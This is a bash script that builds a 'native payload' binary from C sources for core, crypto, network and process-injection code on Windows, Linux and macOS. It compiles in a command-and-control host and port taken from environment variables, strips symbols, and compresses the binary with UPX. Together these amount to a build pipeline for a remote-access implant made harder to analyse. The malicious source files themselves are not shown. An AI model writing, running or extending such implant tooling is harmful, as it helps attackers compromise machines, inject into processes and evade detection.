#!/bin/bash

# Real Build Script for Native Payloads
set -e

echo "========================================"
echo "   NATIVE PAYLOAD BUILD - REAL VERSION"
echo "========================================"

# Directories
SRC_DIR="/workspace/native_payloads"
BUILD_DIR="$SRC_DIR/build"
OUTPUT_DIR="$SRC_DIR/output"

# Clean and create directories
rm -rf $BUILD_DIR $OUTPUT_DIR
mkdir -p $BUILD_DIR $OUTPUT_DIR

# Compiler settings
CC=${CC:-gcc}
CFLAGS="-O2 -Wall -Wextra -I$SRC_DIR/core -I$SRC_DIR/crypto -I$SRC_DIR/network -I$SRC_DIR/inject"
LDFLAGS=""

# C2 Configuration (can be overridden with environment variables)
if [ -n "$C2_HOST" ]; then
    CFLAGS="$CFLAGS -DSERVER_HOST=\"$C2_HOST\""
    echo "C2 Host: $C2_HOST"
fi
if [ -n "$C2_PORT" ]; then
    CFLAGS="$CFLAGS -DSERVER_PORT=$C2_PORT"
    echo "C2 Port: $C2_PORT"
fi

# Platform detection
if [[ "$OSTYPE" == "linux-gnu"* ]]; then
    PLATFORM="linux"
    CFLAGS="$CFLAGS -DPLATFORM_LINUX"
    LDFLAGS="$LDFLAGS -lpthread"
elif [[ "$OSTYPE" == "darwin"* ]]; then
    PLATFORM="macos"
    CFLAGS="$CFLAGS -DPLATFORM_MACOS"
elif [[ "$OSTYPE" == "cygwin" ]] || [[ "$OSTYPE" == "msys" ]]; then
    PLATFORM="windows"
    CFLAGS="$CFLAGS -DPLATFORM_WINDOWS"
    LDFLAGS="$LDFLAGS -lws2_32 -lwininet -lcrypt32"
fi

echo "Platform: $PLATFORM"
echo "Compiler: $CC"
echo ""

# Source files
SOURCES="
    $SRC_DIR/core/main.c
    $SRC_DIR/core/utils.c
    $SRC_DIR/core/commands.c
    $SRC_DIR/crypto/aes.c
    $SRC_DIR/crypto/sha256.c
    $SRC_DIR/network/protocol.c
    $SRC_DIR/inject/inject_core.c
"

# Platform-specific sources
if [ "$PLATFORM" = "windows" ]; then
    SOURCES="$SOURCES $SRC_DIR/windows/winapi.c $SRC_DIR/inject/inject_windows.c"
    LDFLAGS="$LDFLAGS -lpsapi"  # Process API support
elif [ "$PLATFORM" = "linux" ]; then
    SOURCES="$SOURCES $SRC_DIR/linux/linux_impl.c $SRC_DIR/inject/inject_linux.c"
    LDFLAGS="$LDFLAGS -ldl"  # dlopen support
fi

echo "[*] Compiling native payload..."

# Compile with error checking
if $CC $CFLAGS $SOURCES $LDFLAGS -o $OUTPUT_DIR/payload_native 2>$BUILD_DIR/compile.log; then
    echo "✓ Compilation successful!"
    
    # Strip symbols
    strip --strip-all $OUTPUT_DIR/payload_native 2>/dev/null || true
    
    # Get size
    SIZE=$(stat -c%s "$OUTPUT_DIR/payload_native" 2>/dev/null || stat -f%z "$OUTPUT_DIR/payload_native" 2>/dev/null || echo "unknown")
    echo "✓ Binary size: $SIZE bytes"
    
    # Try UPX if available
    if command -v upx &> /dev/null; then
        echo "[*] Compressing with UPX..."
        upx --best --lzma $OUTPUT_DIR/payload_native 2>/dev/null || true
        NEW_SIZE=$(stat -c%s "$OUTPUT_DIR/payload_native" 2>/dev/null || stat -f%z "$OUTPUT_DIR/payload_native" 2>/dev/null || echo "unknown")
        echo "✓ Compressed size: $NEW_SIZE bytes"
    fi
    
    echo ""
    echo "========================================"
    echo "BUILD SUCCESSFUL!"
    echo "Output: $OUTPUT_DIR/payload_native"
    echo "========================================"
    
else
    echo "✗ Compilation failed! See $BUILD_DIR/compile.log for errors"
    cat $BUILD_DIR/compile.log
    exit 1
fi